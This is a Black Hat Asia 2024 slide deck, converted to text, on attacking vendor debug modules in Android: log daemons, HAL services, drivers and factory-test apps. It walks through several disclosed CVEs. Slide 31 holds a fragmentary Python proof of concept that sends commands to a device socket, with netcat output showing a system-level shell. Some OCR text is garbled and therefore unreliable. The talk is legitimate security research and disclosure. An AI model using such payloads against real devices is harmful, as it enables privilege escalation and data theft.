---
title: "Attacking Debug Modules In The Android Ecosystem"
speakers: ["Lewei Qu"]
conference: "Black Hat"
conference_full: "Black Hat ASIA 2024"
edition: "ASIA"
year: 2024
source_pdf: "BlackHat ASIA 2024-Slides/Lewei Qu-Attacking Debug Modules In The Android Ecosystem.pdf"
pages: 36
sha256: "c42cf67bbb752141205744065b38e86d086167d4d73fc6e322ff1c52fda69da9"
text_chars: 18080
ocr_pages: 13
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T00:49:28Z"
---
# Attacking Debug Modules In The Android Ecosystem

**Speakers:** Lewei Qu  
**Conference:** Black Hat ASIA 2024  
**Source:** `BlackHat ASIA 2024-Slides/Lewei Qu-Attacking Debug Modules In The Android Ecosystem.pdf` (36 pages)


## Slide 1

### Attacking Debug Modules In The Android Ecosystem

Lewei Qu(曲乐炜) Chief Information Security Officer, Mogo Auto

#BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
\
_ blackhat
. ASIA 2024>—~
APRIL 18-19, 2024 | lat
, . "BRIEFINGS | >
Attacking Debug Modules In The Android
Ecosystem
Lewei Qu(HHERKS)
Chief Information Security Officer, Mogo Auto
aS. = | j \
—<—e y : 4 \ \
aia y \ a \ > a » — ~ és —
/ | =~
A
```

## Slide 2

## About Me

- ➢ Head of security team in Mogo Auto. Leading the team to protect the cooperative vehicle infrastructure system and improve the level of network and data security of the company

- ➢ Previously focused on mobile/IoT security and has contributed a lot of vulnerabilities in Google Android, Mediatek and Unisoc. 500+ CVEs has been credited. Top1 bug hunter in the Unisoc Product Security Acknowledgements

- ➢ Google top bug hunter in 2022

- ➢ Speaker at BlackHat Europe 2021, BlackHat Aisa 2022, BlackHat USA 2022, KCon 2023, 7<sup>th</sup> kanxue SDC 2023

# BHASIA @BlackHatEvents

## Slide 3

## Agenda

Background Threat Module

Summary
Case Study

# BHASIA @BlackHatEvents

## Slide 4

# Background

# BHASIA @BlackHatEvents

## Slide 5

#### Fragmented Android Ecosystem

###### **OEM**

**Fragmented Product**

**Launcher** ：MIUI, Magic UI, HarmonyOS

**System APP** : **Debug modules** , Notebook, Device interconnection

**PRODUCT Phone Tablet**

**IVI**

**AIoT**

###### **Fragmented System**

##### **SYSTEM Android Open Source Project**

**Fragmentation**

**Framework** ：Vendors modify the service of AOSP to adapt their own hardware feature such as telephony and modem.

**HAL** ：The bridge to connect the framework and driver

###### **Fragmented BSP**

硬件 **SOC**

**Driver** ：Image processing(Camera), WiFi, Bluetooth, GNSS, 4G/5G, Audio processing, Acceleration(GPU/NPU/DSP), Secure element

# BHASIA @BlackHatEvents

## Slide 6

#### Fragmented Android Ecosystem

Vendor Partition HAL
Introduced from Android  Wrapper of low-level
Oreo. Managing vendor  operations for user space
specific BSP code
Security Bulletin ACSRP
Including the criticle and  Android Chipset Security Reward
high vulnerabilities for  Program. Supported by Google in 2019.
SoC But has been shut down in 2023.5

# BHASIA @BlackHatEvents

## Slide 7

#### Android Debug Architecture

- ➢ **Log Capture:** App Log, Kernel Log, Subsystem Log(Modem, DSP, Wi-Fi, Bluetooth)

- ➢ **Function Verification:** Camera, Display, Hardware Peripherals, GPU Rending

- ➢ **Factory Testing:** Vendor Specific

# BHASIA @BlackHatEvents

## Slide 8

#### Android Debug Architecture

##### **Developer options**

- ➢ **General options:** Memory, Error reporting, Oem unlocking

- ➢ **Debugging:** USB debugging, ADB debugging

- ➢ **Network:** Wi-Fi, Bluetooth

- ➢ **Input:** Show touch feedback

- ➢ **Drawing:** Show layout bounds

- ➢ **Hardware acceleration:** GPU rendering

- ➢ **Media:** USB

- ➢ **Monitoring:** Visual information for application performance

https://developer.android.com/studio/debug/dev-options

# BHASIA @BlackHatEvents

## Slide 9

#### Android Debug Architecture **Android Debug Bridge analysis**

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Q
black hat
ASIA 2024
Android Debug Architecture
Android Debug Bridge analysis
System APP Frameworks Native Daemon
Settings
ADE Debug
Open USB debugging Al ebugging
adb
. adbd
Settings. Global. ADB_ENABLED ndroid.debug |AdbManage}, “tl Start
User ContentObserver listening User
SettingsProvider
```

## Slide 10

#### Android Debug Architecture

##### **Log capturing**

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2024
Android Debug Architecture
Log capturing
| _ Android ART Native
android telephony .Riog|iS ALOGV, ALOGW | =
android.util. Log|##2
RLOGD, RLOGE| Radio
SLOGI, SLOGW| System
android.util.EventLog|i2at
android.util. Slog |#=32
Log.printin_native |
v
libandroid_runtime.so
y ¥ # android user-space log man
__android_log_write __android_log_print type logd, domain, domain_deprecated, mlstrustedsubject;
ee | Unix Domain Socket) , type logd_exec, exec_type, file_type;
n4—
__android_log_write_log_message idevisocketlogdw — |——recv > LogListener
init_daemon_domain(l
liblog logd # Read access to pseudo filesystems.
H r_dir_file(logd, proc)
r_dir_file(logd, proc_net)
android_logger_listread = (<—————recv idevisocketlogdr = € —writev LogReader
A allow self:capability setuid setgid sys_nice audit_control
allow self:capability2 syslog;
allow self:netlink_audit_socket create_socket_perms nlmsg_write
kernel:sy read;
ow stem syslo
allow
logcat allow
1 kmsg_device:chr_file w_file_perms;
—>
—>
xd system_data_file:file r_file_perms;
```

## Slide 11

#### Android Debug Architecture

##### **Summary**

- ➢ The debug modules involve multiple interprocess communication (IPC) methods such as Binder Call, Unix Domain Socket, Content Provider, HIDL, etc.

- ➢ The data flow in the debugging module is complex, where user-level data is passed to high-privileged Native Daemon or Driver.

# BHASIA @BlackHatEvents

## Slide 12

#### Vendor Debug Architecture

##### **Why do vendors need to do customized debugging?**

- ➢ **Log capturing** : It is necessary to obtain debug logs from subsystems and have standardized debugging capabilities, which include capturing debug information from all modules, such as MTK's AEE (Android Exception Engine) and UNISOC's ylog.

- ➢ **Function verification:** Telephony (5G Vowifi), connectivity (BT WiFi FM), hardware (Camera DSP), location (GNSS).

- ➢ **Factory testing tools:** Basic checks in factory testing phase including the screen, peripherals, etc.

# BHASIA @BlackHatEvents

## Slide 13

#### Vendor Debug Architecture

##### **Vendor U log capturing**

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Q
black hat
ASIA 2024
Vendor Debug Architecture
.
Vendor U log capturing
BEX ‘A
Native Daemon | ae
Android Log
BT HCl Log qx
- ylog(system qu
| Unix Domain Socket | __ wo’ Ap Cap tog -
H PS Log i
” @ylog_cli | ' ey srtd(system) ARM Pom Log
System APP — : DSP Log Output Mode >
p pe ' mlogservice(shell) DSP Log .
Log Management —_ Bennet og Stings
com.sprd.logmanager { : WIFI/BT Log .
p af, @modem_log_service \ GNSS Log ax
Android Log Control ff —— ' | connmgr(system) Others sev ng —
APLogControl t , Sensorhub Log '.
System APP t af AG-DSP Pcm Dump Log
; AT Command Control ‘ ” @wend HAL Service | AG-DSP Log é
security code | ATControl ' ' DSP Pcm Log
Engineering Mode ‘ ' CP Cap Lo qx
c i—> p @slogmodem t— 1 P Log —
com.sprd.engineermode Modem Log Config y m, _ | el vendor. sprd.hardware.cplog_connmgr@1.0-s: orca ap Log
CPControl ' ' orca dp Log
PP invok '
SE PES Modem Abnormal Monitor
@ylog_cli_cmd ' vendor.sprd.hardware.log@1.0-service
WIFI/BT/GNSS log
WenControl
@hidi_slogmodem
Modem Log Control '
CPLogControl ' ; Native Daemon
@hid|_wend
slogmodem(root)
@hidie_modemd
modemlog_connmgr_service
(root)
eee: 7 ee eee ee
og_service(root)
```

## Slide 14

#### Vendor Debug Architecture

##### **Vendor M log capturing**

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Q
black hat
ASIA 2024
Vendor Debug Architecture
Vendor M log capturing
Send administrative commands through uds
| | | | Ustening for mooming commands
emdiogger mobile log d netdiag connsyslogger
@mdiogger.socket @mobilelogd ldev/sooket/netdiag @connsysfwiogd
| | | Get different types of logs
logd atf log drvier ftrace kernel module
@devw'socket/logdr /proc/atf_log/atf_log ‘sys/kemel/debug/ tracing
```

## Slide 15

#### Vendor Debug Architecture **Vendor U function verification/Factory testing tools**

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2024
Vendor Debug Architecture
Vendor U function verification/Factory testing tools
Androidh as:
10
| Framework |
Binder Call |
ro | |. tg wifiManager ’ ee
Wi-Fi test ' i yn)) #141
RF CALI test
RIC test getMacAdress
System APP Backlight test ; 7 BluetoothManager
Camera test “ —_getaderess
3rd APP invoke > ey hutoatt ools = |System Version test SystemVersionTest}— _
GPS test \\.___ [Unix Domain Socket |__ Native Daemon
\getsn
Bluetooth test YON
\ 4 @enscesresk sre | |_| |_| phasecheckserver
SIM card test \) = (system)
- OTG test
File Read --, System File
*| /proc/version
5 File Open
/sysfouchscreen/chip_id
```

## Slide 16

#### Vendor Debug Architecture

##### **An example**

###### **Problem**

- ➢ "EngineerMode" app by Qualcomm

- ➢ Gain root access through privilege escalation

###### **Reflection**

- ➢ BSPs often come with factory testing tools, which inherently carry out risky operations

- ➢ OEM/ODMs often lack sufficient security awareness and fail to disable or remove factory testing tools.

# BHASIA @BlackHatEvents

## Slide 17

# Threat Module

# BHASIA @BlackHatEvents

## Slide 18

#### Threat Module

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Q
black hat
ASIA 2024
Threat Module
third-party APP
remote debug
tools | | |
Network Socket A). — i call service call broadcast receive provider call >
ce Jb Jb db JL
2 | vl Ava awa ava
System APP EngineerMode Validationtools
fx
s! , ra ; Unix Domain Socket s! , LL
fo /—i
Bluetooth WIFI wifi log network log
Framework sais
Daemon
Camera | aes modemlog | | wu.
“~! log HAL connmrg
Is HAL
[CHIDL > HAL
L“ | Service
modemHAL|) |...
MT - pl .
lOCIL> =
= v_W"
“ _ ylog_buffer agnss_dbg
Toc S o .
L | Driver
debugitracing) | su.
```

## Slide 19

#### Attacking Debug APP

- ➢ 3<sup>rd</sup> APP -> High-privileged app (with a range of permissions)

- ➢ APP exported components -> Local privilege escalation, information leakage

- ➢ Socket port listening -> Remote command execution

# BHASIA @BlackHatEvents

## Slide 20

#### Attacking Debug Deamon

- ➢ Entry point: Unix Domain Socket

➢ Memory Corruption，Information Leak，Command Injection ……

# BHASIA @BlackHatEvents

## Slide 21

#### Attacking Debug HAL Service

- ➢ Entry point: Unix Domain Socket/HIDL

- ➢ Memory Corruption，Information Leak，Command Injection ……

# BHASIA @BlackHatEvents

## Slide 22

#### Attacking Debug Driver

- ➢ Entry point: File Operations

###### ➢ Memory Corruption，Information Leak……

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat
ASIA 2024
Attacking Debug Driver
> Entry point: File Operations
> Memory Corruption, Information Leak......
_ creeps Sepp Serene
WARNING: CPU: 1 PII
5755 at sprd_sysdump_write+@x1d0/@x20c
[ 3431.001448] Modules linked in: ic
dwl_ng(0) fla
2721(0) sprd_fm(0) sprdbt_tty
[ 3431.001501] CPU: 1 PI
5755 Comm: poc_qlw Tainted: G WoO 4.14.1
[ 3431.001504] Hardware name: Spreadtrum SC9863A-1H1@ Board (DT)
[ 3431.001509]
3 task.stack: @000000057e69639
[ 3431.001514] sdi ite+@x1d0/@x2ec
di
31.001518] at sprd_ x1d0/@x20c
[ 3431.001522] pe : [<ffffffscess6fo r : [<ffffFF800846FO80>] pstate: 60400045
[ 3431.001525] sp : fff fff8ee9c13d50
[ 3431.001527] x29: ffffffse09c13d80
[ 3431.001534]
[ 3431.001540]
13 [ 3431.001550]
[ 3431.001557]
[ 3431.001563]
[ 3431.001571]
3431.001577]
3431.001583]
3431.001589]
3431.001594]
3431.001604]
3431.001610]
3431.001616]
3431.001634
3431.001637] beee3bal 91019000 913dd821
3431.001660] 54000421
3431.001680] b@003ba1 9
3431.001700] 52800001
[
[
[
[
[
[
[
[ 3431.001622
[
[
[
[
[
[ 19
3431.001720] f@80 4210000 14000006 aa0003e2 cb@20268 8b2802a0 2a1f
```

## Slide 23

# Case Study

# BHASIA @BlackHatEvents

## Slide 24

#### Vulnerability  Discovery

###### **Findings**

- ➢ 49 CVEs Credit

- ➢ 3 vendors

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat
ASIA 2024
Issue
Vendor
Vulnerability Discov
Weakness Domain
Findings
> 49 CVEs Credit
> 3 vendors
mobile jog. d
```

## Slide 25

#### Information Disclosure

- ➢ CVE-2022-20098

- ➢ Debug Native Daemon: aee_aed/aee_aed64

- ➢ Entry point: UDS com.mtk.aee.aed_64

Accepting parameters to dump information from any process

# BHASIA @BlackHatEvents

## Slide 26

#### Information Disclosure

###### ➢ Debug APP: EngineerMode

Leaking various device identification codes

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat
ASIA 2024
Information Disclosure
> Debug APP: EngineerMode
Leaking various device identification codes
if(this.mPcscfSwitch != null) {
v@_3 = SystemPropertiesProxy.get(
-d( .
if("".equals(v@_3)) {
this .mPcscfSwitch.setChecked(false);
this .mPcscfSwi
else {
this .mPcscfSwitch.setChecked(true) ;
v1_1 = this.mPcscf
v1_1.setSummary(this.getString(@x7Fe
e public
v5
getCdmalnsi() {
(ve, 5
int v1 = this.getPhoneCount();
v2 = new (v1)5
int v3 = 0;
for(v4 = ©; true; ++v4) {
v2.add(v5) 5
v1_l = v25
Ant v2_1 = this.getPhoneCount();
white(v3 < v2_1) {
tch.setSummary(this.getString(@x7F
+ v@_3.trim());
elephonyManagerProxy . INSTANCE .getCdmaImsi (v3);
4f(v4_1 == mult) {
((List)vi_1).set(v3, v5);
}
else
((List)vi_1).set(v3, v4_1)5
}
+435
(ve, + Collectionskt. joinToString$default(vi_1, mull, null, null, @, null, null, @x3F, null));
return ((List)v1_1);
Code
@3-11 16:37:13.646 2835 is
Code
@3-11 13:35:52.354 12774 12774 D PHONEINF: get all IP
@ (value={ » @ public getAllimei() {
ve = ;
d(ve, ds
int v1 = this.getPhoneCount();
v2 = new (v1);
int v3 = @;
int v4;
for(v4 = @; v4 < v1; ++v4) {
v2.add("");
v1.1 = v2;
int v2_1 = this.getPhoneCount();
while(v3 < v2_1) {
v4_1 = this.getTelephoneMgr().getImei(v3);
Intrinsics.checkExpressionValueIsNotNull(v4_1, ;
(( )v1_1).set(v3, v4_1);
++v35
d(ve, + Collectionskt.joinToString$default(v1_1, null, null, null, @, null, null, @x3F, null))
return (( )vi_1);
```

## Slide 27

#### Memory Corruption

- ➢ CVE-2022-48382

- ➢ Debug HAL Service: vendor.sprd.hardware.log@1.0-service

- ➢ Entry point: UDS hidl_common_socket

###### Buffer Overflow

# BHASIA @BlackHatEvents

## Slide 28

#### Memory Corruption

- ➢ CVE-2022-39118

- ➢ Debug Driver: sprd_sysdump

- ➢ Entry point: File Operations

###### Out-of-Bound Write

# BHASIA @BlackHatEvents

## Slide 29

#### Local Privilege Escalation

- ➢ CVE-2022-47339

- ➢ Debug Daemon: cmd_service

- ➢ Entry point: UDS cmd_skt

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2024
Local Privilege Escalation
> CVE-2022-47339 | int64 astcall sub_21BC(_intea a1)
at
> Debug Daemon: cmd service aera mate
pthread_t v4; //
i . FILE *v5; //
> Entry point: UDS cmd_skt ery
__int64 v7; //
int64 v8; //
st char *v9; //
__int64 v1e; //
int64 v11; //
s[4096]; //
v14[40976]; //
_ReadStatusReg(ARM64_SYSREG(3, 3, 13, @, 2));
= *(_DWORD *)(al + 256);
= *(int *)(al + 260);
memset ( » @, @xA@@2@ULL) ;
= pthread_self();
pthread_detach(uA);
zit v = popen((c<
t405g_m8t3:/ # ls -al /data/local/tmp
total
-rw-rw-rw- 1 shell shell @ 2022-09-14 11:26 \r
drwxrwx--x 3 shell shell 3488 2022-09-18 @8:33 .
drwxr-x--x 5 root root 3488 2022-06-25 21:16 ..
drwxrwxrwx 5 shell shell 3488 2022-09-15 13:59 .studio
-rw-rw-r-- 1 shell shell 3624718 2022-09-13 22:10 1.png
22-09-18 08:34 222 —>
```

## Slide 30

#### Exploiting vulnerabilities

- ➢ CVE-2022-27250(Duplicated with Kryptowire)

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Q
black hat
ASIA 2024
Exploiting vulnerabilities
> CVE-2022-27250(Duplicated with Kryptowire)
Kryptowire Identifies Security and Privacy
Vulnerability in Mobile Device Chipset from China
The params are receviced and could test the functions in device. Such ase
1, Camera’
2, Phone
3. FM#
4. BI=
March 15, 2022 — McLean, VA, United States—Kryptowire Inc., a mobile security and privacy solutions company, today 5. Video
announced that they have identified a critical security and privacy vulnerability affecting mobile devices with UNISOC, ;
China's largest designer of chips for mobile phones. The vulnerability within the chipset, if exploited, allows malicious 6. Witie
actors to take control over user data and device functionality. 7 GPS
x
Specifically, the vulnerability allows intruders to access call and system logs, text messages, contacts, and other private Boon el
x
data, video record the device's screen or use the external-facing camera to record video, or even take control of the
device remotely, altering or wiping data. Adhering to its disclosure policy, Kryptowire notified affected device
manufacturers and carriers, as well as UNISOC, of the vulnerability in December 2021.
Thank you for your report! We appreciate your contribution to the Unisoc chipset rewards program.
This issue is duplicated with CVE-2022- 27250 (https://cve_mitre org/cgi-bin/cvename.cgi?name=2022-27250), we have removed SprdAutoSit from
user release build.
```

## Slide 31

#### Exploiting vulnerabilities

- ➢ CVE-2022-27250(Duplicated with Kryptowire)

# BHASIA @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
ASIA 2024
Exploiting vulnerabilities
> CVE-2022-27250(Duplicated with Kryptowire)
fusr/bin/env python3
this sete nction(this.mStatusChangedt istener)); y
- import socket
this. setCurrentAc kAction. getInstance(this.mStatusChongedt istener
import sys
import sys
it
this. tAction.getInst , this Back
af a
def send(payload):
this. setCurr
aa : s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.24.65.249", 7878))
af
ths ark2Action(this.mStatusChangedt istener, this.mContext)); s.send(payload.encode())
a( equals(args)) ( - print("Feed back :")
this. setCurrentAction(RTCTestaction.ge as ener, this.nackStatusChongedl istener));
(2000) )
ance (this ms:
ScriptAction(this.aStatusChangedListener)); ——
1|tue5g_ms8t3:/ $ netcat 127.6.8.1 1234
id
uid=1000(system) gid=1000(system) groups=1000(system) ,1013(media) ,1023(media_rw) ,1065(reserved_disk) ,2001(cache) , 3001(ne
t_bt_admin) , 3002(net_bt) , 3903(inet) ,9997(everybody) ,9997(everybody) context=u:r:sprd_autoslt_app:s@:c512,c768
```

## Slide 32

#### Exploiting vulnerabilities

➢ Limitation of CVE-2022-47339: The "setprop" command requires system-level permissions, and UDS (Unix Domain Socket) connections are subject to SELinux restrictions.

###### Selinux Policy

System Cmd

###### Root Cmd

# BHASIA @BlackHatEvents

## Slide 33

# Summary

# BHASIA @BlackHatEvents

## Slide 34

#### Summary

- ➢ The debug modules cover multiple layers of the system, from the app level to the driver level, resulting in multiple attack surfaces, primarily focused on inter-process communication (IPC).

- ➢ Some debug functionalities require executing high-privileged commands across processes. Improper handling of these commands can lead to local privilege escalation.

- ➢ Factory testing tools often involve Wi-Fi, Bluetooth, and telephony functionalities. Improper handling of these tools can result in information leakage, such as exposing Wi-Fi addresses, Bluetooth addresses, IMEI numbers, and other sensitive information.

# BHASIA @BlackHatEvents

## Slide 35

#### Suggestions

- ➢ **For vendors** :  some debug modules should not release to downstream such as factory testing.

- ➢ **For OEM/ODMs** : BSP modules should be selectively chosen based on specific needs, and not accepted in their entirety

- ➢ **For users** : Regularly perform device security upgrades.

# BHASIA @BlackHatEvents

## Slide 36

Thanks <u>https://twitter.com/sanpangzi321</u>

# BHASIA @BlackHatEvents
